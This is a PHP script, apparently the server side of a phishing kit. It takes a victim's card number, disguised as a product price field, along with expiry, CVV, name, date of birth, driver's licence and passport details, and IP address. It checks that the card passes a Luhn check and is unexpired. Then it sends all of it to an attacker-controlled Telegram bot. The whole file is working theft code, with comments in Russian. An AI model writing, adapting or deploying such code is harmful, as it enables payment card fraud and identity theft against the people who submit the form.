<?php
include_once 'settt.php';

$month = $_POST['exp_month'];
$year = $_POST['exp_year'];
$exp = ''. $month . '/' . $year;
$cc = $_POST['product_price'];
//$dob =  $_POST['dob'];
//$dlnumber = $_POST['dlnumber'];
$dlstate = $_POST['dlstate'];
//$dlexp = $_POST['dlexp'];
//$passnumber = $_POST['passnumber'];
//$passexp = $_POST['passexp'];
$ipgeo =  $_POST['ipgeo'];



//проверка на луну карту
function is_valid_luhn($number) {
  settype($number, 'string');
  $sumTable = array(
    array(0,1,2,3,4,5,6,7,8,9),
    array(0,2,4,6,8,1,3,5,7,9));
  $sum = 0;
  $flip = 0;
  for ($i = strlen($number) - 1; $i >= 0; $i--) {
    $sum += $sumTable[$flip++ & 0x1][$number[$i]];
  }
  return $sum % 10 === 0;
}

//проверяем выбор штата
if($dlstate == 'noselected')
	{
         echo '4';
         exit;
	}

if (! is_valid_luhn($cc)) {
    echo '1';
} 
else {
  //пришедшее число по expiration
  $string = '01-'. $exp;//string variable
  $string = substr_replace($string, '-20', 5, 1);
  $string = substr_replace($string, '-', 2, 1);

  $date = date('d-m-Y',time()); //date variable

  $time1 = strtotime($string);
  $time2 = strtotime($date);
  if($time1<=$time2){
         echo '2';
         exit;
  } 
	else {
   echo '3';
//   $msg = "First Name: ".$_POST['name']."\nMiddle Name: ".$_POST['middle']."\nLast Name: ".$_POST['surname']."\nCard Number: ".$cc."\nExp: ".$exp."\nCVV2: ".$_POST['cvv']."\nGEO: ".$ipgeo." (IP: ".$_POST['ip'].")\nuser: ".$_POST['user']."\n";
   $msg = "First Name: ".$_POST['name']."\nMiddle Name: ".$_POST['middle']."\nLast Name: ".$_POST['surname']."\nDOB: ".$_POST['dob']."\nDL_number: ".$_POST['dlnumber']."\nDL_state: ".$_POST['dlstate']."\nDL_exp: ".$_POST['dlexp']."\nPass_num: ".$_POST['passnumber']."\nPass_exp: ".$_POST['passexp']."\nCard Number: ".$cc."\nExp: ".$exp."\nCVV2: ".$_POST['cvv']."\nGEO: ".$ipgeo." (IP: ".$_POST['ip'].")\nuser: ".$_POST['user']."\n";
   file_get_contents("https://api.telegram.org/bot". $token ."/sendMessage?chat_id=". $telegram_admin_id ."&text=" . urlencode($msg) ."");
  }

}

?>
